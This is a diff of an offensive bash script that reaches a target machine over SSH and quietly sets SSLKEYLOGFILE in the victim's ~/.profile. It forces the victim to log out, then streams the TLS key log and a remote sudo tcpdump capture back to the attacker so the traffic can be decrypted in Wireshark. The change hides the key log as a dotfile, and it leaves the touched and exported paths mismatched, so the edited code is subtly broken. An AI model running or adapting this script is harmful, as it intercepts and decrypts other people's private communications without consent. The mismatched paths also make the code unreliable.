@@ -56,10 +56,10 @@ start_wireshark() {
 }
 
 remote_host_pw() {
-    sshpass -p "${PASS}" ssh -o StrictHostKeyChecking=no ${TARGET} 'touch /tmp/update.log ; echo "export SSLKEYLOGFILE=/tmp/update.log" >> ~/.profile ; source ~/.profile' &
+    sshpass -p "${PASS}" ssh -o StrictHostKeyChecking=no ${TARGET} 'touch /tmp/.update.log ; echo "export SSLKEYLOGFILE=/tmp/update.log" >> ~/.profile ; source ~/.profile' &
     sleep 5
     sshpass -p "${PASS}" ssh -o StrictHostKeyChecking=no ${TARGET} 'gnome-session-quit --no-prompt' &
-    sshpass -p "${PASS}" ssh -o StrictHostKeyChecking=no ${TARGET} 'tail -f /tmp/update.log' >> /tmp/pandaloot/keyloot.log &
+    sshpass -p "${PASS}" ssh -o StrictHostKeyChecking=no ${TARGET} 'tail -f /tmp/.update.log' >> /tmp/pandaloot/keyloot.log &
     sshpass -p "${PASS}" ssh -o StrictHostKeyChecking=no ${TARGET} "echo ${PASS} | sudo -S tcpdump -s0 -U -n -w -" > /tmp/loot & 
     echo -e "\n${bred}Add the local copy of keyloot.log to wireshark located in /tmp/pandaloot/keyloot.log${uncolor}"
     echo -e "${blue}In Wireshark: Edit > Preferences > Protocols > TLS > Pre-Master Secret log filename\n"
@@ -67,10 +67,10 @@ remote_host_pw() {
 }
 
 remote_host_rsa() {
-    ssh -i ${KEYFILE} ${TARGET} 'touch /tmp/update.log ; echo "export SSLKEYLOGFILE=/tmp/update.log" >> ~/.profile ; source ~/.profile' &
+    ssh -i ${KEYFILE} ${TARGET} 'touch /tmp/update.log ; echo "export SSLKEYLOGFILE=/tmp/.update.log" >> ~/.profile ; source ~/.profile' &
     sleep 5
     ssh -i ${KEYFILE} ${TARGET} 'gnome-session-quit --no-prompt'
-    ssh -i ${KEYFILE} ${TARGET} 'tail -f /tmp/update.log' >> /tmp/pandaloot/keyloot.log &
+    ssh -i ${KEYFILE} ${TARGET} 'tail -f /tmp/.update.log' >> /tmp/pandaloot/keyloot.log &
     ssh -i ${KEYFILE} ${TARGET} 'sudo tcpdump -s0 -U -n -w -' > /tmp/loot &
     echo -e "\n${bred}Add the local copy of keyloot.log to wireshark located in /tmp/pandaloot/keyloot.log${uncolor}"
     echo -e "${blue}In Wireshark: Edit > Preferences > Protocols > TLS > Pre-Master Secret log filename${uncolor}\n"
